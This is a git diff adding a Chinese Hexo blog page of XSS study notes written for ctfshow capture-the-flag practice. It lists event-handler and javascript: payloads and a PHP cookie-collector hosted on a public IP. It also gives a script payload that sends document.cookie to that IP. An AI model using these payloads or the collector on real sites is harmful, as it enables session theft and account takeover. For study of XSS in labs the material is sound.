<span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseout</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>a</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.qq.com&quot;</span>&gt;</span>qq<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:a&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">kycg.asp?ttt</span>=<span class="string">1000</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">y</span>=<span class="string">2016</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="6-有云服务器后"><a href="#6-有云服务器后" class="headerlink" title="6.有云服务器后"></a>6.有云服务器后</h3><p>终于配置好自己的云服务器了，也就是终于有公网ip可以去写ctfshow的题目了，我会介绍下使用方法</p>
+<p>首先，我们把获取cookie的php脚本部署到我们的网站上，由于没买域名，所以只能通过ip访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">118.31.168.4:1996/cookie.php</span><br></pre></td></tr></table></figure>
+
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 过滤和清理用户输入</span></span><br><span class="line">    <span class="variable">$cookie</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$cookie</span>); <span class="comment">// 过滤特殊字符</span></span><br><span class="line">    <span class="comment">// 其他可能的过滤和验证</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 写入文件</span></span><br><span class="line">    <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$myfile</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$cookie</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Cookie 已成功写入文件。&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;无法打开文件进行写入。&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未提供 cookie 数据。&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这是一个简单的通过GET请求获取cookie的脚本，会在目录下生成一个.txt的文件储存cookie，我们用蚁剑给自己开后门就能轻易看到数据了</p>
+<p>然后我们就直接开启ctfshow吧</p>
+<p>由于第一关就是最简单的无过滤反射，所以直接写代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://118.31.168.4:1996/cookie.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>也是写上ctfshow了</p>
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-02-20T17:14:31+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Feb 20, 2025</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/02/13/xss/&title=xss - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/02/13/xss/&title=xss - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/02/13/xss/&title=xss - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2025/02/09/php%E7%89%B9%E6%80%A7/'>
+          <p class='title'>php特性<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>PHP特性笔记前言受不了了，其他漏洞看题解和天书一样，要不就要写各种脚本，要不就各种看不懂的操作和各种神秘函数，看来我php根本不够格，这是为ctfshow，php特性专门开的笔记
+89关源代码...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/2025/02/13/xss/index.html#comments">
+    </span>
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
+    
+
+    <div id="layoutHelper-comments"></div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2772,97 +2973,48 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
     
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">1.XSS漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="toc-text">1.概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-text">2.利用执行方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-XSS%E5%8D%B1%E5%AE%B3"><span class="toc-text">3.XSS危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%AE%80%E5%8D%95%E4%BB%A3%E7%A0%81"><span class="toc-text">4.简单代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-XSS%E9%AA%8C%E8%AF%81"><span class="toc-text">5.XSS验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-text">2.XSS漏洞分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">1.反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">2.存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DOM%E5%9E%8BXSS"><span class="toc-text">3.DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-XSS-payload"><span class="toc-text">3.XSS payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">4.绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-level2-%E9%97%AD%E5%90%88"><span class="toc-text">1.level2 闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-level3-%E4%BA%8B%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-text">2.level3 事件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-level5-%E6%8F%92%E5%85%A5%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-text">3.level5 插入标签绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-level6-%E5%A4%A7%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">4.level6 大写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-level7-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">5.level7 双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-level8-href%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">6.level8 href编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-level9-%E6%8F%92%E5%85%A5%E6%8C%87%E5%AE%9A%E5%86%85%E5%AE%B9%E7%BB%95%E8%BF%87"><span class="toc-text">7.level9 插入指定内容绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-level10-%E9%9A%90%E8%97%8F%E4%BC%A0%E5%8F%82"><span class="toc-text">8.level10 隐藏传参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-level11-HTTP%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="toc-text">9.level11 HTTP头绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-level15-ng-include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">10.level15 ng-include文件包含</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2890,13 +3042,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2905,14 +3058,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -3410,7 +3563,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/02/13/xss/","name":"xss"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"xss","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/02/13/xss/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/02/13/xss/","wordCount":0,"datePublished":"2025-02-13T12:44:12.000Z","dateModified":"2025-02-20T09:14:31.155Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
